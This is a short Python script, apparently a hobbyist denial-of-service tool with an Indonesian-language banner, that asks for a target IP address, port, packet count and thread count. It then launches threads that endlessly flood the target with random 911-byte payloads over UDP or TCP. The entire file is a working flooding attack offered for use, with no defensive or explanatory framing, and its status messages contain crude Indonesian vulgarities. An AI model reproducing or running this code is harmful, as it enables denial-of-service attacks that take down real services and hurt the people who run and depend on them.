#!/usr/bin/env python3
import random
import socket
import threading
import os
import sys

os.system("clear")
print("  ========[ DDOS ATACK GRISZLY ]========= ")
print("  ==========[ Hello Kang Ddos ]========== ")
print("  =========[ Tunggu sebentar!! ]========= ")
print("  =============[ Loading 0% ]============ ")
print("  ============[ Loading 50% ]============ ")
print("  ============[ Loading 100% ]=========== ")
print("  ======[ Selamat Datang di Tools ]====== ")

ip = str(input(" IP TARGET:"))
port = int(input(" PORT:"))
choice = str(input(" MAU DIKIRIM PAKETNYA BRO?(y/n):"))
times = int(input(" PACKETS:"))
threads = int(input(" THREAD:"))
def run():
	data = random._urandom(911)
	i = random.choice(("[PACKETS!!]","[PACKETS!!]","[PACKETS!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" SAMLEKOM PAKET MANK !!!")
		except:
			print("[!] DUAR KOMTLO!!!")

def run2():
	data = random._urandom(911)
	i = random.choice(("[PACKET!!]","[PACKET!!]","[PACKET!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" SAMLEKOM SEBLAK!!!")
		except:
			s.close()
			print("[*] DUAR MEMEQ!!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
